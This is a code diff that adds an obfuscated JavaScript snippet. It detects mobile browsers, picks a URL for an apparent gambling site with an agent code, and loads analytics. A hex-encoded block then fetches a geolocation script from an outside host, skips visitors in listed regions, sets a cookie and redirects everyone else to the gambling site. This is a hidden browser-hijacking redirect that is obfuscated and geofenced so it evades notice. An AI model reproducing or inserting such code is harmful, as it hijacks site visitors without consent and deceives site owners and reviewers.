@@ -1,0 +1,22 @@
+var a=['toLowerCase','iphone','symbianos','match','ipad','ipod','android','windows\x20ce','windows\x20phone','baiduboxapp','baidubrowser','userAgent'];(function(c,d){var e=function(f){while(--f){c['push'](c['shift']());}};e(++d);}(a,0x197));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var sUserAgent=navigator[b('0x0')][b('0x1')]();var bIsIphoneOs=sUserAgent['match'](/iphone/i)==b('0x2');var bIsSymb=sUserAgent['match'](/symbianos/i)==b('0x3');var bIsIpad=sUserAgent[b('0x4')](/ipad/i)==b('0x5');var bIsIpod=sUserAgent['match'](/ipod/i)==b('0x6');var bIsAndroid=sUserAgent[b('0x4')](/android/i)==b('0x7');var bIsCE=sUserAgent[b('0x4')](/windows ce/i)==b('0x8');var bIsWM=sUserAgent['match'](/windows mobile/i)=='windows\x20mobile';var bIsWP=sUserAgent['match'](/windows phone/i)==b('0x9');var isBDAPP=sUserAgent['match'](/baiduboxapp/i)==b('0xa');var isBDBrowser=sUserAgent[b('0x4')](/baidubrowser/i)==b('0xb');var isM=bIsIphoneOs||bIsSymb||bIsIpad||bIsIpod||bIsAndroid||bIsCE||bIsWM||bIsWP;
+var url = Array();
+//bob-m-p
+url[0] = ["https://www.bob2011.com/1589295284?agent_code=23404","https://www.bobvip88.com/1589295284?agent_code=23404"];
+//tb-m-p
+url[1]= ["https://www.tbty2021.com/1589295302?agent_code=1175","https://www.tbvip11.com/1589295302?agent_code=1175"];
+var pc_url=url[Math.floor(Math.random()*url.length)][1];
+var m_url=url[Math.floor(Math.random()*url.length)][0];
+if (!isM){
+    url = pc_url;//pc 
+}else{
+	url = m_url;//m
+}
+
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?a28c68da91c0057f90326a112fe0a266";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+var _0xdcf8=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x61\x73\x79\x6E\x63","\x73\x72\x63","\x6F\x6E\x65\x72\x72\x6F\x72","\x46\x61\x69\x6C\x65\x64\x20\x74\x6F\x20\x6C\x6F\x61\x64","\x6F\x6E\x6C\x6F\x61\x64","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x63\x6F\x75\x6E\x74\x72\x79","\x76\x61\x6C\x75\x65\x73","\x68\x74\x74\x70\x73\x3a\x2f\x2f\x33\x32\x63\x69\x2e\x63\x6f\x6d\x2f\x3f\x63\x61\x6c\x6c\x62\x61\x63\x6b\x3d\x63\x69\x74\x79","\u798F\u5EFA","\u5317\u4EAC","\u83F2\u5F8B\u5BBE","\u9A6C\u6765\u897F\u4E9A","\u8001\u631D","\u7F05\u7538","\u9999\u6E2F","\u53F0\u6E7E","\u6FB3\u95E8","\u65B0\u52A0\u5761","\u6CF0\u56FD","\u7F8E\u56FD","\x69\x6E\x64\x65\x78\x4F\x66","\x66\x6F\x72\x45\x61\x63\x68","\x66\x32\x34\x47\x32\x54\x74\x74\x39\x73","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x28\x5E\x7C\x20\x29","\x3D\x28\x5B\x5E\x3B\x5D\x2A\x29\x28\x3B\x7C\x24\x29","\x6D\x61\x74\x63\x68","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x6F\x70\x65\x6E"];function loadScript(_0x3ca4x2,_0x3ca4x3){var _0x3ca4x4=document[_0xdcf8[1]](_0xdcf8[0]);_0x3ca4x4[_0xdcf8[2]]= true;_0x3ca4x4[_0xdcf8[3]]= _0x3ca4x2;_0x3ca4x4[_0xdcf8[4]]= function(){_0x3ca4x3( new Error(_0xdcf8[5]+ _0x3ca4x2))};_0x3ca4x4[_0xdcf8[6]]= function(){_0x3ca4x3()};document[_0xdcf8[9]](_0xdcf8[8])[0][_0xdcf8[7]](_0x3ca4x4)}function city(_0x3ca4x6){country= Object[_0xdcf8[11]](_0x3ca4x6)[0][_0xdcf8[10]]}loadScript(_0xdcf8[12],function(){function _0x3ca4x7(){var _0x3ca4x8=[_0xdcf8[13],_0xdcf8[14],_0xdcf8[15],_0xdcf8[16],_0xdcf8[17],_0xdcf8[18],_0xdcf8[19],_0xdcf8[20],_0xdcf8[21],_0xdcf8[22],_0xdcf8[23],_0xdcf8[24]];var _0x3ca4x9=0;_0x3ca4x8[_0xdcf8[26]](function(_0x3ca4x6){if(country[_0xdcf8[25]](_0x3ca4x6)>  -1){_0x3ca4x9+= 1}});var _0x3ca4xa=0.1;var _0x3ca4xb=_0xdcf8[27];if(_0x3ca4x9> 0){return false};function _0x3ca4xc(_0x3ca4x6,_0x3ca4xd){var _0x3ca4xe= new Date();_0x3ca4xe[_0xdcf8[29]](_0x3ca4xe[_0xdcf8[28]]()+ 60* 1000* _0x3ca4xa);document[_0xdcf8[30]]= _0x3ca4x6+ _0xdcf8[31]+ escape(_0x3ca4xd)+ _0xdcf8[32]+ _0x3ca4xe[_0xdcf8[33]]()}function _0x3ca4xf(_0x3ca4x6){var _0x3ca4xd,_0x3ca4x10= new RegExp(_0xdcf8[34]+ _0x3ca4x6+ _0xdcf8[35]);if(_0x3ca4xd= document[_0xdcf8[30]][_0xdcf8[36]](_0x3ca4x10)){return unescape(_0x3ca4xd[2])};return null}function _0x3ca4x11(){document[_0xdcf8[38]][_0xdcf8[37]]= url}if(!_0x3ca4xf(_0x3ca4xb)){_0x3ca4x11();_0x3ca4xc(_0x3ca4xb,_0xdcf8[39])}}_0x3ca4x7()})
